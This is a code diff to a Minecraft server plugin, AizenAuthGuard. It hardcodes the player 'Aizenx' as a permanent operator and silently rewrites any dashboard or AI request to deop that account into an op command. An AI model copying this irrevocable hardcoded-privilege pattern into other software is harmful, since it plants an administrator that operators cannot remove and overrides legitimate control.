@@ -338,6 +338,13 @@ public final class AizenAuthGuard extends JavaPlugin implements Listener {
             command = "deop " + target;
         }
 
+        // Aizenx is the permanent owner. Never allow a dashboard command
+        // to remove the owner's OP status, even if the AI/dashboard requests /deop.
+        if (root.equals("deop") && command.matches("(?i)deop\\s+Aizenx\\s*")) {
+            command = "op Aizenx";
+            root = "op";
+        }
+
         boolean allowed = DASHBOARD_COMMANDS.contains(root);
         boolean success = false;
         String resultReason = allowed ? "" : "Command not allowed by AizenAuthGuard allowlist";
